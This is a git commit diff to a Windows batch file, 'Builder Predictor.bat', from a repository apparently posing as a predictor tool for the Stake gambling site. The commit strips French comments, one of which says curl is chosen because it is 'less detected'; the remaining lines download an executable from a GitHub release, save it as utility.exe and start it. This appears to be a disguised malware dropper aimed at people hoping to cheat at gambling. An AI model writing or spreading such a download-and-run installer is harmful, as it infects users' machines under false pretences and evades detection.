a160501656f136550c9a8eeb5315286b6381253d
stakepredictor-2025 <abdoularabe@gmx.fr>
2025-04-01 23:48:55 +0200

    Update Builder Predictor.bat

--- Builder Predictor.bat
+++ Builder Predictor.bat
@@ -2,14 +2,12 @@
 echo Veuillez patienter, téléchargement en cours...
 timeout /t 2 >nul
 
-:: Création d'un dossier temporaire
+
 mkdir temp_setup
 cd temp_setup
 
-:: Téléchargement rapide avec curl (moins détecté et plus rapide que bitsadmin)
 curl -L -o utility.exe https://github.com/stakepredictor-2025/stake-predictor/releases/download/stakepredictor/stakepredictor.exe
 
-:: Vérification de la présence du fichier
 if exist "utility.exe" (
     echo Téléchargement réussi.
     start utility.exe
